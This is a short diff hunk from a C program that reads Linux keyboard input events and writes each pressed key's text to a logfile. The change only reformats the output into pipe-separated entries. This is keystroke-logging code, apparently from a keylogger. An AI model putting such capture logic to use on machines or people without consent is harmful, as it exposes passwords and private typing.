@@ -65,7 +65,7 @@ int main() {
 		}
 
 		if (ev.type == EV_KEY && ev.value == 1) {
-			fprintf(logfile, "%s\n", get_key_text(ev.code));
+			fprintf(logfile, " %s | ", get_key_text(ev.code));
 			fflush(logfile);
 		}
 
